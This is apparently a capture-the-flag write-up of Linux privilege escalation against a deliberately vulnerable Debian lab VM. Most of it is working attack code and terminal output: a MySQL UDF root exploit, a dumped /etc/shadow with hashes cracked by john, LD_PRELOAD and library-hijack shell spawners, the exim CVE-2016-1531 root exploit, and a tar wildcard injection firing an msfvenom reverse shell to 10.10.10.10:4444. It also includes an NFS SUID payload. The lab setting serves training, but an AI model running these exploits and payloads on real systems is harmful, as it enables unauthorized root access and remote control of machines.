
# [Task 1] Deploy the Vulnerable Debian VM
## Run the "id" command. What is the result?
```
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

# [Task 2] Service Exploits
```bash
user@debian:~/tools/mysql-udf$ cat raptor_udf2.c
/*
 * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
 *
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is an helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!), slightly modified to work
 * with newer versions of the open-source database. Tested on MySQL 4.1.14.
 *
 * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 *
 * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 * for the security vulnerabilities in the handling of User Defined Functions
 * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 * details, please refer to:
 *
 * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
 * http://www.wisec.it/vulns.php?page=4
 * http://www.wisec.it/vulns.php?page=5
 * http://www.wisec.it/vulns.php?page=6
 *
 * "UDFs should have at least one symbol defined in addition to the xxx symbol
 * that corresponds to the main xxx() function. These auxiliary symbols
 * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and
 * xxx_add() functions". -- User Defined Functions Security Precautions
 *
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
 *
 * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
 *
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}

// milw0rm.com [2006-02-20]user@debian:~/tools/mysql-udf$
user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
user@debian:~/tools/mysql-udf$ ls -al
total 20
drwxr-xr-x 2 user user 4096 May 20 06:55 .
drwxr-xr-x 8 user user 4096 May 15 06:35 ..
-rw-r--r-- 1 user user 3378 May 15 05:55 raptor_udf2.c
-rw-r--r-- 1 user user 5344 May 20 06:55 raptor_udf2.o
user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
user@debian:~/tools/mysql-udf$ ls -al
total 32
drwxr-xr-x 2 user user 4096 May 20 06:56 .
drwxr-xr-x 8 user user 4096 May 15 06:35 ..
-rw-r--r-- 1 user user 3378 May 15 05:55 raptor_udf2.c
-rw-r--r-- 1 user user 5344 May 20 06:55 raptor_udf2.o
-rwxr-xr-x 1 user user 8272 May 20 06:56 raptor_udf2.so
user@debian:~/tools/mysql-udf$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system return integer soname 'raptor_udf2.so';
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'return integer soname 'raptor_udf2.so'' at line 1
mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
rootbash-4.1# whoami
root
```

## [Task 3] Weak File Permissions - Readable /etc/shadow
```
user@debian:~/tools/mysql-udf$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::


sha512crypt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
password123
```

## [Task 4] Weak File Permissions - Writable /etc/shadow
```
mkpasswd -m sha-512 newpasswordhere

```

## [Task 5] Weak File Permissions - Writable /etc/passwd
```
openssl passwd newpasswordhere

uid=0(root) gid=0(root) groups=0(root)
```

## [Task 6] Sudo - Shell Escape Sequences
```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

## [Task 7] Sudo - Environment Variables
```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~$ cd /home/user/tools/sudo/
user@debian:~/tools/sudo$ ls
library_path.c  preload.c
user@debian:~/tools/sudo$ cat preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
user@debian:~/tools/sudo$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
user@debian:~/tools/sudo$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~/tools/sudo$ sudo LD_PRELOAD=/tmp/preload.so /usr/bin/man
root@debian:/home/user/tools/sudo# whoami
root
root@debian:/home/user/tools/sudo# exit
exit
What manual page do you want?
user@debian:~/tools/sudo$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff3eeff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f5e739bb000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f5e73797000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f5e7355d000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f5e73341000)
        libc.so.6 => /lib/libc.so.6 (0x00007f5e72fd5000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f5e72dd0000)
        librt.so.1 => /lib/librt.so.1 (0x00007f5e72bc8000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f5e72991000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f5e7278c000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f5e72564000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5e73e78000)
user@debian:~/tools/sudo$ cat library_path.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
user@debian:~/tools/sudo$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
user@debian:~/tools/sudo$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/home/user/tools/sudo# whoami
root
root@debian:/home/user/tools/sudo#
```

## [Task 8] Cron Jobs - File Permissions
```
cat /etc/crontab
```

## [Task 9] Cron Jobs - PATH Environment Variable
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p
```

## [Task 10] Cron Jobs - Wildcards
```
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
nc -nvlp 4444
```

## [Task 11] SUID / SGID Executables - Known Exploits
```
user@debian:~$ cat /home/user/tools/suid/exim/cve-2016-1531.sh
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps.
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
#
# -- Hacker Fantastic
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```

## [Task 16] Passwords & Keys - History Files
```
cat ~/.*history | less
```

## [Task 17] Passwords & Keys - Config Files
```

```

## [Task 18] Passwords & Keys - SSH Keys
```

```

## [Task 19] NFS
```
cat /etc/exports

mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf


```
